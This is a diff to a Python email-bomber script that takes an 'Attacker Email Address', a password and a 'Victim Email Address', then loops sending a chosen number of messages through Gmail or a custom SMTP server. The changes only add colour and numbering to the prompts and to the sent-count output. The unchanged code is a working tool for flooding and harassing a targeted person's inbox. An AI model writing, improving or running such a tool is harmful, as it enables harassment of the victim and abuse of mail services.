@@ -24,13 +24,14 @@ print("$$$$$$$$\$$ | $$ | $$ \$$$$$$$ $$ $$ |      $$$$$$$  \$$$$$$  $$ | $$ | $
 print("\________\__| \__| \__|\_______\__\__|      \_______/ \______/\__| \__| \__\_______/ \_______\__|      ")
 print('\n\n')
 print("")
-user = input(chalk.green('Anonymous name: '))
-email = input(chalk.green('\nAttacker Email Address: '))
-passwd = getpass(chalk.green.bold('\nAttacker Email Password: '))
-to = input(chalk.red('\nVictim Email Address: '))
-total = input('\nNumber of emails: ')
-body = input('\nMessage: ')
-Cserver = input('\nCustom smtp server (leave blank to use gmail): ')
+
+user = input(chalk.green('[1] ----> Anonymous name: '))
+email = input(chalk.green('\n[2] ----> Attacker Email Address: '))
+passwd = getpass(chalk.green.bold('\n[3] ----> Attacker Email Password: '))
+to = input(chalk.red('\n[4] ----> Victim Email Address: '))
+total = input(chalk.blue('\n[5] ----> Number of emails: '))
+body = input(chalk.blue('\n[6] ----> Message: '))
+Cserver = input(chalk.red('\n[+] Custom smtp server (leave blank to use gmail): '))
 
 if not Cserver == '':
     defaultconf = False
@@ -55,7 +56,7 @@ try:
         subject = urandom(9)
         msg = 'From: ' + user + '\nMessage: ' + '\n' + body
         server.sendmail(email, to, msg)
-        print("\rE-mails sent: %i" % i)
+        print(chalk.green.bold("\r[+] E-mails sent: %i" % i))
         sleep(1)
         sys.stdout.flush()
     server.quit()
